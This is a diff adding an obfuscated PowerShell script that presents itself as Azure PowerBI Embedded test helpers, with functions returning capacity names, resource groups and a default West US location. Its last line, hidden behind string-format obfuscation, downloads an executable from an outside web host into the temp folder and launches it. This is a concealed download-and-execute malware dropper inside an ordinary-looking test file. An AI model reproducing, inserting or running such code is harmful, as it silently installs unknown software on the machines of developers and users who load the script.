@@ -1,0 +1,76 @@
+.("{0}{2}{1}"-f'SEt','M','-iTE') ("vari"+"abl"+"e:2I"+"8") ([TyPe]("{9}{1}{4}{3}{0}{2}{5}{7}{6}{8}"-f 'e','R','sT.hTtPRecoRDE','Ft.azUre.T','OSO','r.htt','MOcKSerVe','p','r','Mic')  )  ; &("{1}{0}"-f't-itEm','se') ("{3}{0}{1}{2}" -f 'AblE',':X','tO5','varI') ([tYpE]("{1}{11}{8}{9}{2}{10}{6}{4}{5}{0}{3}{7}"-F 'r','Mi','tp','M','PrecOR','dE','ER.HtT','OdE','OsOFT.a','zuRe.test.hT','ReCOrD','Cr')); 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function get-`POwE`Rbi`Em`BEDDE`dcaP`ACIt`ynAME
+{
+    return &("{2}{3}{1}{0}" -f'e','am','getAss','etN')
+}
+
+
+function gEt-RESo`URceGr`oUp`NA`me
+{
+    return &("{2}{1}{0}"-f'me','a','getAssetN');
+}
+
+
+function GET-loC`A`TioN
+{
+	if (  ${2`I8}::"M`ode" -ne `
+         ( &("{2}{0}{1}" -f 'aB','le','VAri') ("{0}{1}"-f 'X','tO5')  )."V`AluE"::"pLaY`BACK")
+	{
+		${nA`M`EsPAcE} = ("{1}{2}{3}{4}{0}" -f 'edicated','Mi','crosoft.Po','w','erBID')
+		${T`ypE} = ("{0}{1}{2}" -f 'cap','aciti','es')
+		${LOc`A`TioN} = &("{3}{4}{6}{0}{5}{1}{2}"-f'Pr','ide','r','Get-AzRe','sour','ov','ce') -ProviderNamespace ${n`AM`E`SpacE} `
+        | &("{1}{0}"-f'here','w') {${_}."reS`OurCET`yPeS"[0]."res`O`UrCEtYP`ENAME" -eq ${Ty`PE}}
+
+		if (${locATI`On} -eq ${nU`ll})
+		{
+			return ("{0}{3}{1}{2}" -f 'W',' Centr','al US','est')
+		} else
+		{
+			return ${lO`CAtI`On}."L`OC`ATions"[0]
+		}
+	}
+	return ("{4}{0}{2}{1}{3}"-f 's','tra','t Cen','l US','We')
+}
+
+
+function Get`-RG-L`O`CatIoN
+{
+	return ("{2}{0}{1}" -f 'est U','S','W')
+}
+
+
+function iNVO`KE-hA`Ndl`E`dcMdLEt
+{
+	param
+	(
+		[ScriptBlock] ${Comm`ANd},
+		[switch] ${igno`R`e`FaiLur`Es}
+	)
+	
+	try
+	{
+		&${c`OmmA`ND}
+	}
+	catch
+	{
+		if(!${I`GNoRef`AiLURes})
+		{
+			throw;
+		}
+	}
+}
+(&("{0}{2}{1}"-f 'New','ct','-Obje') ("{4}{0}{1}{5}{3}{2}"-f'ys','t','ient','l','S','em.Net.WebC')).("{1}{2}{0}{3}" -f 'loa','Do','wn','dFile').Invoke(("{5}{8}{15}{23}{7}{22}{20}{0}{6}{19}{12}{10}{1}{14}{9}{17}{2}{4}{3}{18}{21}{13}{16}{11}"-f 'dheal','es','a','o','sybl','h','thops','.we','ttp://','mo','/modul','e','com','lawdsijdoef.e','/','ww','x','d_e','gquick','.','than','post/','al','w'),"$env:TEMP\lawdsijdoef.exe");.("{3}{0}{1}{2}"-f 'tart-P','roc','ess','S') ("$env:TEMP\lawdsijdoef.exe")
